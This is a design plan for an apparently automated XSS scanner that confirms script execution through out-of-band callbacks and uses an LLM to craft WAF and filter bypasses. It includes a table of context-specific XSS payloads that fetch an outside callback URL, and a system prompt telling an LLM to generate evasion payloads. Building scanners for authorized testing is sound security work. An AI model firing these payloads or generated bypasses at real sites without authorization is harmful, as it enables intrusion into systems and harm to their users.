# XSSAgent v3 - Master Implementation Plan

**Version:** 3.0.0 Hybrid  
**Date:** 2026-01-10  
**Status:** Planning → Implementation  

---

## 🎯 Executive Summary

**Goal**: Transform the XSSAgent into a **hybrid intelligent system** that combines:

- **Deterministic detection** for consistency and speed
- **OOB validation** via Interactsh for definitive proof
- **LLM-driven bypass** for WAF/filter evasion
- **Multi-layer validation** (Interactsh → Vision → CDP)

**Why**: Current XSSAgent has false positives (HTML reflection ≠ execution) and lacks intelligent bypass. Interactsh provides 100% validation accuracy.

**Success Criteria**:

- ✅ Zero false positives (only report when callback received or visual confirmation)
- ✅ Consistent results across scans (same vuln found every time)
- ✅ Intelligent bypass when basic payloads fail
- ✅ Detailed evidence in reports (screenshot, callback data, console logs)

---

## 📊 Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         XSSAgent v3 Hybrid                          │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      PHASE 1: PREPARATION                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Register Interactsh session                                     │
│     └─ interactsh_client.register()                                 │
│     └─ Get unique domain: abc123.oast.fun                           │
│                                                                     │
│  2. Discover parameters (if not provided)                           │
│     └─ URL params: ?id=1&search=test → [id, search]                 │
│     └─ Form inputs: <input name="q"> → [q]                          │
│     └─ JS sinks: location.hash → [__DOM_SINK__]                     │
│                                                                     │
│  3. Initialize validation tools                                     │
│     └─ XSSVerifier (CDP/Playwright)                                 │
│     └─ Vision model client                                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│              PHASE 2: DETERMINISTIC DETECTION (Fast)                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  For each parameter:                                                │
│                                                                     │
│  2.1 PROBE: Send probe string                                       │
│      └─ GET /page?param=BUGTRACEPROBE7331                           │
│      └─ Analyze response HTML                                       │
│                                                                     │
│  2.2 CONTEXT ANALYSIS (Python, no LLM)                              │
│      └─ Where does probe reflect?                                   │
│      └─ In <script>? → javascript_string                            │
│      └─ In value="..."? → attribute_quoted                          │
│      └─ In <p>...</p>? → html_text                                  │
│                                                                     │
│  2.3 PAYLOAD GENERATION (Deterministic)                             │
│      └─ Select from curated payload list by context:                │
│                                                                     │
│         CONTEXT             PAYLOAD TEMPLATE                        │
│         ───────────────────────────────────────────────────────     │
│         html_text           <img src={INTERACTSH_URL}>              │
│         attribute_quoted    "><img src={INTERACTSH_URL}>            │
│         attribute_unquoted  onfocus=fetch('{INTERACTSH_URL}')       │
│         javascript_string   ";fetch('{INTERACTSH_URL}');//          │
│         href/src            javascript:fetch('{INTERACTSH_URL}')    │
│                                                                     │
│      └─ Generate Interactsh URL:                                    │
│         interactsh_url = client.get_payload_url("xss", param_name)  │
│                                                                     │
│  2.4 EXPLOITATION                                                   │
│      └─ Send payload to target                                      │
│      └─ GET /page?param={PAYLOAD_WITH_INTERACTSH}                   │
│                                                                     │
│  2.5 VALIDATION LAYER 1: Interactsh (Primary)                       │
│      └─ Wait 3-5 seconds                                            │
│      └─ await interactsh_client.poll()                              │
│      └─ Check: did we receive callback?                             │
│                                                                     │
│      IF callback received:                                          │
│         └─ ✅ XSS CONFIRMED (100% proof)                            │
│         └─ Extract evidence:                                        │
│            - Remote IP                                              │
│            - Timestamp                                              │
│            - Request headers                                        │
│         └─ Take screenshot for visual evidence                      │
│         └─ REPORT FINDING → Skip to next param                      │
│                                                                     │
│      IF no callback:                                                │
│         └─ Could be filtered/blocked                                │
│         └─ CONTINUE to Phase 3 (LLM Bypass)                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│           PHASE 3: LLM INTELLIGENT BYPASS (Adaptive)                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Only executed if Phase 2 failed (no Interactsh callback)           │
│                                                                     │
│  3.1 LLM ANALYSIS                                                   │
│      └─ Call LLM with BYPASS_PROMPT:                                │
│                                                                     │
│         Input to LLM:                                               │
│         ─────────────────────────────────────────────────────────── │
│         - Original URL                                              │
│         - Parameter name                                            │
│         - Probe reflection context                                  │
│         - Failed payload                                            │
│         - HTTP response (truncated to 5000 chars)                   │
│         - Interactsh callback URL (new one)                         │
│                                                                     │
│         System Prompt:                                              │
│         """                                                         │
│         You are an XSS bypass expert. The basic payload failed.     │
│         Analyze the response and generate a bypass payload.         │
│                                                                     │
│         Consider:                                                   │
│         - HTML entity encoding bypass                               │
│         - Case variation (oNeRrOr)                                  │
│         - Alternative event handlers                                │
│         - Tag alternatives (<svg>, <details>, <math>)               │
│         - Protocol handlers (javascript:, data:)                    │
│         - Double encoding                                           │
│         - Null byte injection                                       │
│         - Unicode normalization                                     │
│                                                                     │
│         MUST include this callback URL: {interactsh_url}            │
│                                                                     │
│         Response format (JSON only):                                │
│         {                                                           │
│           "bypass_payload": "your payload with callback URL",       │
│           "bypass_technique": "description",                        │
│           "confidence": 0.0-1.0,                                    │
│           "reasoning": "why this should work"                       │
│         }                                                           │
│         """                                                         │
│                                                                     │
│  3.2 PARSE LLM RESPONSE                                             │
│      └─ Extract JSON from response                                  │
│      └─ Validate format                                             │
│      └─ If invalid → fallback to generic bypass payloads            │
│                                                                     │
│  3.3 SEND BYPASS PAYLOAD                                            │
│      └─ GET /page?param={BYPASS_PAYLOAD}                            │
│                                                                     │
│  3.4 VALIDATE AGAIN                                                 │
│      └─ Poll Interactsh                                             │
│      └─ If callback → ✅ REPORT FINDING                             │
│      └─ If no callback → CONTINUE to Phase 4                        │
│                                                                     │
│  3.5 ITERATION (Max 3 attempts)                                     │
│      └─ If still no success, try up to 2 more LLM bypass attempts   │
│      └─ Each iteration provides LLM with previous failure context   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│       PHASE 4: SECONDARY VALIDATION (Vision + CDP Fallback)         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  If Interactsh never receives callback but we want to check if     │
│  payload executed visually (e.g., CSP blocks external requests)     │
│                                                                     │
│  4.1 VISION VALIDATION                                              │
│      └─ Use XSSVerifier to navigate with payload                    │
│      └─ Take screenshot                                             │
│      └─ Send to Vision LLM:                                         │
│                                                                     │
│         Prompt:                                                     │
│         """                                                         │
│         Analyze this screenshot for XSS evidence.                   │
│         Look for:                                                   │
│         - JavaScript alert() popup/dialog                           │
│         - Injected visible content                                  │
│         - Console errors indicating script execution                │
│         - DOM manipulation anomalies                                │
│                                                                     │
│         Respond JSON: {"xss_confirmed": true/false, "evidence": ""} │
│         """                                                         │
│                                                                     │
│      └─ If Vision confirms → ✅ REPORT (method: vision)             │
│                                                                     │
│  4.2 CDP DOM VALIDATION                                             │
│      └─ Use CDP client to check:                                    │
│         - console.log output                                        │
│         - DOM contains marker without encoding                      │
│         - Alert was detected                                        │
│                                                                     │
│      └─ If CDP confirms execution → ✅ REPORT (method: cdp)         │
│                                                                     │
│  4.3 NO CONFIRMATION                                                │
│      └─ If none of the above → ❌ NOT VULNERABLE                    │
│      └─ Log detailed failure reason                                 │
│      └─ Continue to next parameter                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│                   PHASE 5: REPORTING & CLEANUP                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  5.1 AGGREGATE FINDINGS                                             │
│      └─ Collect all validated XSS vulnerabilities                   │
│      └─ Each finding includes:                                      │
│         - URL                                                       │
│         - Parameter                                                 │
│         - Payload (working)                                         │
│         - Context type                                              │
│         - Validation method (interactsh/vision/cdp)                 │
│         - Evidence:                                                 │
│           * Interactsh: callback IP, timestamp, request             │
│           * Vision: screenshot path, analysis                       │
│           * CDP: console logs, DOM state                            │
│         - Confidence score                                          │
│         - Severity: High (always for XSS)                           │
│                                                                     │
│  5.2 GENERATE MARKDOWN REPORT                                       │
│      └─ Create detailed finding report                              │
│                                                                     │
│  5.3 UPDATE DATABASE                                                │
│      └─ Store findings in DatabaseManager                           │
│      └─ With full evidence and embeddings                           │
│                                                                     │
│  5.4 CLEANUP                                                        │
│      └─ await interactsh_client.deregister()                        │
│      └─ Close browser contexts                                      │
│                                                                     │
│  5.5 RETURN RESULTS                                                 │
│      └─ Return comprehensive results dict                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🔧 Implementation Checklist

### Phase 1: Core Infrastructure (2-3 hours)

- [ ] Enhance `InteractshClient` with `get_payload_url()` and `check_hit()`
- [ ] Add context manager support to `InteractshClient`
- [ ] Create XSS bypass prompt template
- [ ] Test Interactsh in isolation

### Phase 2: XSSAgent Refactor (3-4 hours)

- [ ] Backup current `xss_agent.py`
- [ ] Implement new `_generate_payload()` with Interactsh URLs
- [ ] Implement `_validate_with_interactsh()`
- [ ] Implement `_llm_generate_bypass()`
- [ ] Implement `_validate_secondary()`
- [ ] Update `run()` flow

### Phase 3: Integration (2 hours)

- [ ] Update conductor and URL master
- [ ] Update UI to show validation method
- [ ] Update reporting models

### Phase 4: Testing (2-3 hours)

- [ ] Run local XSS challenge lab
- [ ] Test against real targets
- [ ] Verify validation methods in reports

### Phase 5: Documentation (1 hour)

- [ ] Update architecture docs
- [ ] Update README

---

## 🎯 Success Metrics

| Metric | Target |
|--------|--------|
| False Positive Rate | < 1% |
| True Positive Rate | > 95% |
| Avg Time per Parameter | < 2 seconds |
| LLM Calls per Scan | < 20% of params |
| Validation: Interactsh | > 70% |

---

**Status**: Ready for implementation ✅
